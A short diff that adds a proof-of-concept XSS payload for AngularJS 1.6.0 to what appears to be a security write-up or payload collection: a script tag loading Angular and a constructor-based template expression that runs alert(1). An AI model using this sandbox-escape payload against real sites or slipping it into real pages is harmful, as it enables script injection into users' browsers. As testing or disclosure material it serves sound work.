@@ -225,6 +225,11 @@ As Array:
 ```
 **Angular 1.6.0**
 
+```
+<script src="//ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js"></script>
+{{0[a='constructor'][a]('alert(1)')()}}
+```
+
 ---
 
 **Impact**
